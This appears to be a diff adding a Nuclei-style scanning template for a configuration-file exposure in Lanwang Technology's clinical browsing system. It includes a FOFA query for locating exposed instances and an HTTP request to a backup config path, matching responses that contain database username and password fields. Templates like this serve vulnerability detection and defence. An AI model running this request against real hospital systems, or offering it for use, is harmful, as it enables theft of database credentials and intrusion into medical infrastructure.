@@ -1,0 +1,28 @@
+id: lanwang-clinical-config-info-leak
+
+info:
+  name: "蓝网科技临床浏览系统配置文件敏感数据暴露"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: body="蓝网科技股份有限公司" && title="临床浏览"
+      蓝网科技临床浏览系统存在配置文件访问控制缺陷，攻击者可利用该漏洞通过特定路径访问系统配置文件，获取包含数据库凭证及系统参数的敏感信息。该漏洞源于系统未对配置文件设置有效的访问权限校验机制。
+  tags: 蓝网科技临床浏览系统
+
+http:
+- raw:
+  - |
+    GET /config/config%20bak.txt HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'DBPassword'
+  - type: word
+    part: body
+    words:
+    - 'DBUserName'
